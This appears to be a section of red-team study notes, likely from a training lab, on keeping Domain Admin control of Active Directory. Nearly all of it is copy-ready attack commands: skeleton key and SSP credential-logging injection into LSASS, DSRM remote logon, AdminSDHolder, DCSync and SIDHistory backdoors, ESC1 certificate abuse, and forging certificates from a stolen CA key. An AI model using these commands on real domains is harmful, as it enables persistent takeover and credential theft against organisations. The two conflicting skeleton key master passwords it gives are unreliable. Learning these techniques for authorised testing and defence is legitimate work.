# 07 — AD CS & Domain Persistence

> [!NOTE]
> Domain persistence techniques allow an attacker to maintain administrative control over a compromised Active Directory environment, survive password resets, and regain Domain Admin / Enterprise Admin access at will.

---

## Domain Persistence Mechanisms

### 1. Skeleton Key
Injects an in-memory master password into LSASS on Domain Controllers. Allows authentication as *any* domain user using the master password (`msfadmin` / `password`), while legitimate passwords continue to work.

```text
# Run on DC as DA / SYSTEM
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
```powershell
# Authenticate using master password 'lsaketo' / 'mimikatz'
Enter-PSSession -ComputerName DC01 -Credential (Get-Credential)
```

### 2. Custom Security Support Provider (SSP)
Injects a custom DLL into LSASS or configures `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` to log plaintext credentials on every local and domain logon to `C:\Windows\System32\kiwissp.log`.

```text
# In-memory DLL injection (no reboot required)
mimikatz # privilege::debug
mimikatz # misc::memssp
```
```cmd
# Persistent Registry addition (requires reboot)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0kiwissp" /f
copy mimilib.dll C:\Windows\System32\kiwissp.dll
```

### 3. Directory Services Restore Mode (DSRM) Admin Persistence
DSRM is a local administrator account on DCs. By default, DSRM login is disabled unless booting into Safe Mode. Changing the `DsrmAdminLogonBehavior` registry key allows DSRM authentication over SMB/WinRM using NTLM hashes.

```cmd
# Enable DSRM login for network / remote authentication (Behavior = 2)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f

# Reset DSRM password on DC via ntdsutil
ntdsutil "set dsrm password" "reset password on server null" q q
```

### 4. AdminSDHolder & SDProp Concept
The `AdminSDHolder` object (`CN=AdminSDHolder,CN=System,DC=domain,DC=local`) acts as a permissions template for protected groups (Domain Admins, Enterprise Admins, Schema Admins). Every 60 minutes, the SDProp process overwrites the ACL of all protected accounts with the ACL of `AdminSDHolder`.

Adding `GenericAll` or `WriteDacl` to `AdminSDHolder` creates an invisible persistence mechanism that automatically restores privileges even if removed.

```powershell
# Add GenericAll for attacker user on AdminSDHolder template
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All

# Force SDProp process manually (or wait 60 mins)
Invoke-ADSDPropagation
```

### 5. DCSync ACL Persistence
Grant `Replicating Directory Changes` and `Replicating Directory Changes All` rights to a non-privileged account directly on the Domain Head.

```powershell
# Grant DCSync permissions to student1 using PowerView
Add-DomainObjectAcl -TargetIdentity "DC=dcorp,DC=moneycorp,DC=local" -PrincipalIdentity student1 -Rights DCSync
```
```bash
# Grant DCSync permissions using Bloody-AD
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> add dcsync student1
```

### 6. DC Host Security Descriptor Modification
Modify the DACL on the DC Computer object itself to grant `GenericAll` or `WriteDacl` rights, allowing password resets or RBCD takeover of the Domain Controller machine account.

```powershell
# Grant GenericAll on DC computer object to standard user
Add-DomainObjectAcl -TargetIdentity "dcorp-dc" -PrincipalIdentity student1 -Rights All
```

---

## AD CS Certificate Abuse (ESC1)

A template is vulnerable to ESC1 if **all four conditions** are met:
1. **Client Authentication EKU** enabled
2. **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** enabled (requester controls SAN)
3. **Manager approval disabled**
4. **Low-privileged users** hold `Enroll` permissions

### Enumerate & Abuse
```powershell
. C:\AD\Tools\PSPKIAudit.ps1
Invoke-PKIAudit
```
```cmd
Certify.exe find /vulnerable
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:\AD\Tools\cert.pfx /password:P@ss123! /outfile:C:\AD\Tools\admin_tgt.kirbi /domain:dcorp.moneycorp.local /dc:dcorp-dc.dcorp.moneycorp.local /ptt
```

---

## CA Private Key Extraction & ForgeCert

If an attacker has admin on the CA server, export the CA key and forge certificates offline.

```text
mimikatz # privilege::debug
mimikatz # crypto::certificates /systemstore:local_machine /export
```
```cmd
ForgeCert.exe --CaCertPath C:\AD\Tools\ca.pfx --CaCertPassword P@ss123! --Subject "CN=Administrator" --SubjectAltName Administrator@dcorp.moneycorp.local --NewCertPath C:\AD\Tools\forged_admin.pfx --NewCertPassword P@ss123!
Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\forged_admin.pfx /password:P@ss123! /ptt
```

---

## SIDHistory Persistence Injection

`SIDHistory` preserves access rights during domain migrations. Adding `Domain Admins` SID (`-512`) to a standard user's `SIDHistory` grants full DA privileges.

```powershell
Stop-Service -Name ntds -Force
Add-ADDBSidHistory -SamAccountName student1 -SidHistory 'S-1-5-21-3537233777-2717541362-1549646036-512' -DatabasePath C:\Windows\NTDS\ntds.dit
Start-Service -Name ntds
```
